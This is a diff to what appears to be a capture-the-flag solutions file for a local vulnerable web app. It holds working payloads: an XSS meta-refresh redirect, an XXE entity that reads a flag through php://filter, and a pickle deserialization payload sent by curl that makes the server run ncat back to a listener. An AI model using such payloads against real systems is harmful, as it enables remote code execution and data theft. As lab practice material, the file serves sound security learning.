@@ -33,12 +33,6 @@ XSS with Content-Security-Policy (High)
 <meta http-equiv="refresh" content="1; url=http://localhost:5000/XSS3/flag">
 
 
-XML Blind injection
-----------------------------
-https://www.youtube.com/watch?v=ySJwlMsFbco
-Refer to script
-
-
 XXE injection
 ------------------------
 https://www.youtube.com/watch?v=kiGoOuuXWFI
@@ -55,17 +49,23 @@ https://www.youtube.com/watch?v=kiGoOuuXWFI
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:5000/XXE/flag" >
 ]>
-<food>
+<foo>
     <name>Tonkatsu &xxe;</name> 
     <toppings>Add Ajitama</toppings> 
-    <optional>Add Beef</optional></food>
+    <optional>Add Beef</optional></foo>
+
+
+XML Blind injection
+----------------------------
+https://www.youtube.com/watch?v=ySJwlMsFbco
+Refer to script
 
 
 Pickle Insecure Deserialization
 ---------------------------
 Refer to script
 ncat -klnvp 9000
-curl -d "function=decode&input=\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x13ncat 127.0.0.1 9000\x94\x85\x94R\x94." http://127.0.0.1:5000/INSEC/
+curl -d "function=decode&input=b'\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x13ncat 127.0.0.1 9000\x94\x85\x94R\x94.'" http://127.0.0.1:5000/INSEC/
 
 
 
